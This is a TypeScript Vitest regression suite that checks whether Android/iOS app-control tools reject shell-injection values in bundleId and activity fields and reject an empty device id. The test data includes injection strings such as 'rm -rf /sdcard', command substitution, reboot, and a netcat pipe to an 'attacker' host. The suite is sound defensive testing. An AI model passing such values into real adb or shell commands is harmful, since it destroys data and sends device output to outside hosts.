import { describe, it, expect } from "vitest";
import { launchAppTool } from "../src/tools/launch-app";
import { restartAppTool } from "../src/tools/restart-app";
import { openUrlTool } from "../src/tools/open-url";
import { reinstallAppTool } from "../src/tools/reinstall-app";
import { createDescribeTool } from "../src/tools/describe";
import { Registry } from "@argent/registry";

/**
 * Regressions for the command-injection review finding (#1) and the
 * empty-udid routing finding (#7).
 *
 * The attack surface: every Android branch interpolates `bundleId` (and
 * sometimes `activity`) directly into an `adb shell "<template>"` string,
 * which is re-parsed on-device. Without validation, a `bundleId` of
 * `com.x;rm -rf /` executes arbitrary on-device shell.
 *
 * Fix: zod `.regex` on bundleId / activity, and `.min(1)` on udid so an
 * empty string can't be routed to `adb -s "" shell ...` (which silently
 * falls back to the default device on multi-device hosts).
 */

describe("bundleId validation — tools that interpolate into adb shell", () => {
  const toolCases = [
    { name: "launch-app", schema: launchAppTool.zodSchema, baseArgs: { udid: "emulator-5554" } },
    { name: "restart-app", schema: restartAppTool.zodSchema, baseArgs: { udid: "emulator-5554" } },
  ];

  const injectionPayloads = [
    "com.foo;rm -rf /sdcard",
    "com.foo`touch /sdcard/owned`",
    "com.foo$(touch /sdcard/owned)",
    "com.foo && reboot",
    "com.foo | nc attacker 1234",
    "com.foo\nmalicious",
    "com.foo'; id; echo '",
  ];

  for (const { name, schema, baseArgs } of toolCases) {
    for (const payload of injectionPayloads) {
      it(`${name} rejects bundleId with shell metachars: ${JSON.stringify(payload)}`, () => {
        const parsed = schema.safeParse({ ...baseArgs, bundleId: payload });
        expect(parsed.success).toBe(false);
      });
    }

    it(`${name} accepts a normal bundleId like com.example.app`, () => {
      const parsed = schema.safeParse({ ...baseArgs, bundleId: "com.example.app" });
      expect(parsed.success).toBe(true);
    });

    it(`${name} accepts a bundleId with hyphens (e.g. org.some-vendor.app)`, () => {
      // Hyphens are allowed in iOS bundle ids — but the same safe-alphabet
      // regex lets them through for both platforms.
      const parsed = schema.safeParse({ ...baseArgs, bundleId: "org.some-vendor.app" });
      expect(parsed.success).toBe(true);
    });
  }
});

describe("activity validation — launch-app Android branch", () => {
  it("accepts a dot-prefixed activity (.MainActivity)", () => {
    const parsed = launchAppTool.zodSchema.safeParse({
      udid: "emulator-5554",
      bundleId: "com.example.app",
      activity: ".MainActivity",
    });
    expect(parsed.success).toBe(true);
  });

  it("accepts a fully-qualified activity (pkg/.Component)", () => {
    const parsed = launchAppTool.zodSchema.safeParse({
      udid: "emulator-5554",
      bundleId: "com.example.app",
      activity: "com.example.app/.MainActivity",
    });
    expect(parsed.success).toBe(true);
  });

  it("rejects an activity with a shell backtick", () => {
    const parsed = launchAppTool.zodSchema.safeParse({
      udid: "emulator-5554",
      bundleId: "com.example.app",
      activity: ".Main`id`",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects an activity with `;`", () => {
    const parsed = launchAppTool.zodSchema.safeParse({
      udid: "emulator-5554",
      bundleId: "com.example.app",
      activity: ".Main;reboot",
    });
    expect(parsed.success).toBe(false);
  });
});

describe('empty-udid guard (#7) — cross-platform tools reject `udid: ""`', () => {
  // Without .min(1), an empty udid flows through to `adb -s "" shell …`
  // which silently targets the default device on a multi-host setup.
  const toolCases: Array<{
    name: string;
    schema: { safeParse: (x: unknown) => { success: boolean } };
    extra: Record<string, unknown>;
  }> = [
    { name: "launch-app", schema: launchAppTool.zodSchema, extra: { bundleId: "com.x" } },
    { name: "restart-app", schema: restartAppTool.zodSchema, extra: { bundleId: "com.x" } },
    { name: "open-url", schema: openUrlTool.zodSchema, extra: { url: "https://example.com" } },
    {
      name: "reinstall-app",
      schema: reinstallAppTool.zodSchema,
      extra: { bundleId: "com.x", appPath: "/tmp/x.apk" },
    },
    {
      name: "describe",
      schema: createDescribeTool(new Registry()).zodSchema,
      extra: {},
    },
  ];

  for (const { name, schema, extra } of toolCases) {
    it(`${name} rejects empty udid`, () => {
      const parsed = schema.safeParse({ udid: "", ...extra });
      expect(parsed.success).toBe(false);
    });
  }
});
